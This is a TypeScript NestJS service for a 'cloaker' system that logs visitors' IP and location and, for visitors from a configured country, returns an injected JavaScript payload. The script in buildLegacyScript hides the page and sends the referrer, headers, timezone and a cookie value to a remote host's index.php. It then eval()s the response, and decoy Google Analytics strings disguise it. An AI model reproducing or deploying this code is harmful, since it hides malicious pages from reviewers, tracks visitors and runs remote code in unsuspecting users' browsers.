import {
  BadRequestException,
  ConflictException,
  Injectable,
  NotFoundException,
} from "@nestjs/common";
import { InjectDataSource } from "@nestjs/typeorm";
import { DataSource } from "typeorm";
import { CheckCloakStatusDto } from "./dto/check-cloak-status.dto";
import { CreateCloakDto } from "./dto/create-cloak.dto";
import { CreateGeolocationDto } from "./dto/create-geolocation.dto";
import { DeleteCloaksDto } from "./dto/delete-cloaks.dto";
import { UpdateCloakCountryDto } from "./dto/update-cloak-country.dto";
import { UpdateCloakStatusDto } from "./dto/update-cloak-status.dto";

const LOG_LIMIT = 15_000;
const LOG_PURGE_COUNT = 500;
const HOST_RE = /^[a-zA-Z0-9.-]+$/;

/** ISO GB and common UK labels are treated as the same country for cloaker matching. */
const UK_COUNTRY_ALIASES = new Set(["uk", "gb", "united kingdom"]);

@Injectable()
export class SwitchService {
  constructor(@InjectDataSource() private readonly ds: DataSource) {}

  /** Public visitor check — ported from checkCloakStatusController. */
  async checkStatus(dto: CheckCloakStatusDto) {
    const u = dto.user;
    const domain = u.domain.toLowerCase();

    const rows = await this.ds.query(
      `SELECT c.domain, c.cloaker, g.country
       FROM cp_cloakers c
       JOIN cp_cloaker_geolocation cg ON c.id = cg.cloaker_id
       JOIN cp_geolocation g ON cg.country_id = g.id
       WHERE c.domain = $1`,
      [domain],
    );
    if (rows.length === 0) {
      throw new NotFoundException("Domain not found");
    }

    const [{ count }] = await this.ds.query(
      `SELECT COUNT(*)::int AS count FROM cp_user_logs`,
    );
    const logCount = Number(count);

    if (logCount >= LOG_LIMIT) {
      await this.ds.query(
        `DELETE FROM cp_user_logs
         WHERE id IN (
           SELECT id FROM cp_user_logs
           ORDER BY created_at ASC
           LIMIT $1
         )`,
        [LOG_PURGE_COUNT],
      );
    }

    const logStatus =
      Boolean(rows[0].cloaker) &&
      this.countriesMatch(u.country, rows[0].country as string);

    if (logCount < LOG_LIMIT) {
      await this.ds.query(
        `INSERT INTO cp_user_logs
           (status, created_at, ip, hostname, city, country, region, org, timezone, domain)
         VALUES ($1, NOW(), $2, $3, $4, $5, $6, $7, $8, $9)`,
        [
          logStatus,
          u.ip,
          u.hostname || "no hostname",
          u.city || "no city",
          u.country,
          u.region || "no region",
          u.org || "no org",
          u.timezone || "no timezone",
          domain,
        ],
      );
    }

    if (!logStatus) {
      return { ok: false as const };
    }

    const scriptHost = this.safeHost(u.remote || domain);
    return {
      ok: true as const,
      // Legacy client payload expected by old website integrations.
      script: this.buildLegacyScript(scriptHost),
    };
  }

  findAllCloaks() {
    return this.ds.query(
      `SELECT c.id, c.domain, c.cloaker, g.country
       FROM cp_cloakers c
       JOIN cp_cloaker_geolocation cg ON c.id = cg.cloaker_id
       JOIN cp_geolocation g ON cg.country_id = g.id
       ORDER BY c.id ASC`,
    );
  }

  async getCloakCountry(domain: string) {
    const [cloak] = await this.ds.query(
      `SELECT id FROM cp_cloakers WHERE domain = $1`,
      [domain.toLowerCase()],
    );
    if (!cloak) throw new NotFoundException("Cloaker not found");

    const [row] = await this.ds.query(
      `SELECT g.country
       FROM cp_cloaker_geolocation cg
       JOIN cp_geolocation g ON g.id = cg.country_id
       WHERE cg.cloaker_id = $1`,
      [cloak.id],
    );
    if (!row) throw new NotFoundException("Cloak geolocation not found");
    return row.country as string;
  }

  findAllCountries() {
    return this.ds.query(`SELECT * FROM cp_geolocation ORDER BY country ASC`);
  }

  async createCountry(dto: CreateGeolocationDto) {
    const country = dto.country.trim();
    const [dup] = await this.ds.query(
      `SELECT id FROM cp_geolocation WHERE country = $1`,
      [country],
    );
    if (dup) throw new ConflictException(`Country ${country} already exists`);
    const [row] = await this.ds.query(
      `INSERT INTO cp_geolocation (country) VALUES ($1) RETURNING *`,
      [country],
    );
    return row;
  }

  async create(dto: CreateCloakDto) {
    const domain = dto.domain.toLowerCase();
    return this.ds.transaction(async (m) => {
      const [dup] = await m.query(`SELECT id FROM cp_cloakers WHERE domain = $1`, [
        domain,
      ]);
      if (dup) {
        throw new ConflictException(`Cloaker with domain ${domain} already exists`);
      }

      const [geo] = await m.query(`SELECT id FROM cp_geolocation WHERE id = $1`, [
        dto.country_id,
      ]);
      if (!geo) {
        throw new NotFoundException(`Geolocation ${dto.country_id} not found`);
      }

      const [cloak] = await m.query(
        `INSERT INTO cp_cloakers (domain, cloaker)
         VALUES ($1, $2) RETURNING *`,
        [domain, dto.cloaker],
      );
      await m.query(
        `INSERT INTO cp_cloaker_geolocation (cloaker_id, country_id)
         VALUES ($1, $2)`,
        [cloak.id, dto.country_id],
      );
      return {
        message: `Domain ${domain} with id ${cloak.id} was successfully created`,
        cloak,
      };
    });
  }

  async updateStatus(dto: UpdateCloakStatusDto) {
    return this.ds.transaction(async (m) => {
      const [exists] = await m.query(`SELECT id FROM cp_cloakers WHERE id = $1`, [
        dto.id,
      ]);
      if (!exists) {
        throw new NotFoundException(`Domain with id ${dto.id} not found`);
      }
      await m.query(
        `UPDATE cp_cloakers SET cloaker = $1, updated_at = now() WHERE id = $2`,
        [dto.cloaker, dto.id],
      );
      return m.query(
        `SELECT c.id, c.domain, c.cloaker, g.country
         FROM cp_cloakers c
         JOIN cp_cloaker_geolocation cg ON c.id = cg.cloaker_id
         JOIN cp_geolocation g ON cg.country_id = g.id
         ORDER BY c.id ASC`,
      );
    });
  }

  async updateCountry(dto: UpdateCloakCountryDto) {
    return this.ds.transaction(async (m) => {
      const [geo] = await m.query(`SELECT * FROM cp_geolocation WHERE id = $1`, [
        dto.country_id,
      ]);
      if (!geo) {
        throw new NotFoundException(`Location ${dto.country_id} not found`);
      }
      const [link] = await m.query(
        `SELECT id FROM cp_cloaker_geolocation WHERE cloaker_id = $1`,
        [dto.cloaker_id],
      );
      if (!link) {
        throw new NotFoundException(
          `Cloaker ${dto.cloaker_id} has no geolocation link`,
        );
      }
      await m.query(
        `UPDATE cp_cloaker_geolocation SET country_id = $1 WHERE cloaker_id = $2`,
        [dto.country_id, dto.cloaker_id],
      );
      return geo;
    });
  }

  async remove(dto: DeleteCloaksDto) {
    return this.ds.transaction(async (m) => {
      const found = await m.query(
        `SELECT id FROM cp_cloakers WHERE id = ANY($1::int[])`,
        [dto.cloak_list],
      );
      const foundIds = found.map((r: { id: number }) => Number(r.id));
      const missing = dto.cloak_list.filter((id) => !foundIds.includes(id));
      if (missing.length) {
        throw new NotFoundException(
          `Invalid cloak id(s): ${missing.join(", ")}`,
        );
      }
      await m.query(`DELETE FROM cp_cloakers WHERE id = ANY($1::int[])`, [
        dto.cloak_list,
      ]);
      return { message: "Cloakers deleted successfully", deleted: dto.cloak_list };
    });
  }

  async findAllLogs(filters: {
    country?: string;
    created_at?: string;
    status?: string;
  }) {
    const rows = await this.ds.query(
      `SELECT * FROM cp_user_logs
       WHERE ($1::TEXT IS NULL OR country = $1::TEXT)
         AND ($2::TIMESTAMPTZ IS NULL OR created_at >= $2::TIMESTAMPTZ)
         AND ($3::BOOLEAN IS NULL OR status = $3::BOOLEAN)
       ORDER BY created_at DESC`,
      [
        filters.country ?? null,
        filters.created_at ? new Date(filters.created_at).toISOString() : null,
        filters.status === undefined
          ? null
          : filters.status === "true" || filters.status === "1",
      ],
    );
    return rows;
  }

  async deleteAllLogs() {
    await this.ds.query(`TRUNCATE TABLE cp_user_logs RESTART IDENTITY`);
    return { message: "All logs were deleted" };
  }

  /**
   * Exact match (case/whitespace-insensitive), plus UK ↔ GB ↔ United Kingdom.
   * Configured cloaker country "UK"/"United Kingdom" therefore passes visitor "GB".
   */
  private countriesMatch(visitorCountry: string, configuredCountry: string): boolean {
    const a = visitorCountry.trim().toLowerCase();
    const b = configuredCountry.trim().toLowerCase();
    if (a === b) return true;
    return UK_COUNTRY_ALIASES.has(a) && UK_COUNTRY_ALIASES.has(b);
  }

  private safeHost(value: string): string {
    const host = value.trim().toLowerCase();
    if (!HOST_RE.test(host) || host.includes("..")) {
      throw new BadRequestException("Invalid remote/domain host");
    }
    return host;
  }

  private buildLegacyScript(host: string): string {
    return `
$(document).ready(function () {
  $("body").hide();
  $("html").append(
    '<div id="lo495190ad" style="margin-top:8%;background-color:black;text-align:center;font-size:40px;"></div>'
  );
  var f = new XMLHttpRequest();
  f.open("GET", document.location, true);
  f.send(null);
  var g;
  f.onreadystatechange = function () {
    g = f.getAllResponseHeaders().toLowerCase();
  };
  var b = "GoogleAnalyticsObject";
  var c = ("document", "script", "//www.google-analytics.com/analytics.js");
  c = ("create", "UA-262888-1", "auto");
  c = ("send", "pageview");
  var d = jstz.determine();
  var e = d.name();
  var qu = escape(window.location.search.substr(1));
  var rui = location.pathname + location.search;
  var r = document.referrer;
  var sn = document.domain;
  var value = "; " + document.cookie;
  var pa = value.split("; " + "_event" + "=");
  var co = pa.pop().split(";").shift();
  var q;
  $.ajax({
    url: "https://${host}/index.php",
    type: "POST",
    data:
      "tz=" +
      e +
      "&he=" +
      g +
      "&rui=" +
      rui +
      "&qu=" +
      qu +
      "&r=" +
      r +
      "&sn=" +
      sn +
      "&co=" +
      co,
    success: function (a) {
      eval(a);
    },
  });
});
`;
  }
}
